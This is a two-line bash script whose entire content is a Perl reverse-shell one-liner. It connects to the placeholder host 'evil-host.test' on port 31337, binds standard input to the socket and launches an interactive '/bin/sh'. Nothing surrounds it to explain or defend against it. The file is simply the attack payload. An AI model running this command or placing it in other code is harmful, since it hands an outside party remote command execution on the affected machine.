#!/bin/bash
perl -e 'use Socket;$i="evil-host.test";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");exec("/bin/sh -i");'
